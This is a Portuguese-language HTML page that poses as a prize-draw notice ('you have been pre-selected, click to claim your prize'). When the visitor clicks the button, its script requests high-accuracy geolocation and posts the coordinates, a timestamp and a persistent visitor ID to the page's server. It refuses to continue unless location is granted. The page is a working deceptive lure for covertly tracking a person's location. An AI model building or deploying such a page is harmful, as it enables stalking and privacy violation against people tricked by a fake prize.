<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8"/>
  <title>Continue para o sorteio</title>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <style>
    body{margin:0;padding:40px;font:18px/1.5 sans-serif;background:#fafafa;text-align:center}
    button{margin-top:30px;padding:12px 28px;font-size:18px;border:0;background:#34b7f1;color:#fff;border-radius:6px;cursor:pointer}
    button:disabled{background:#ccc}
  </style>
</head>
<body>
  <h1>Parabéns! Você foi pré-selecionado.</h1>
  <p>Clique abaixo para resgatar seu prêmio.</p>
  <button id="btn">Resgatar agora</button>

  <script>
    const uid = localStorage.getItem('uid') || ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g,c=>(c^crypto.getRandomValues(new Uint8Array(1))[0]&15>>c/4).toString(16));
    localStorage.setItem('uid',uid);

    btn.onclick=()=>{
      btn.disabled=true;
      btn.textContent='Aguarde…';
      navigator.geolocation.getCurrentPosition(
        pos=>{
          // opcional: envia o primeiro fix
          fetch('/api/ping',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({id:uid,lat:pos.coords.latitude,lng:pos.coords.longitude,ts:Date.now()})
          }).catch(()=>{});
          location.replace('/painel.html?id='+uid);
        },
        err=>{
          alert('Para continuar, ative a localização e recarregue.');
          btn.disabled=false;
          btn.textContent='Tentar novamente';
        },
        {enableHighAccuracy:true,timeout:15000,maximumAge:0}
      );
    };
  </script>
</body>
</html>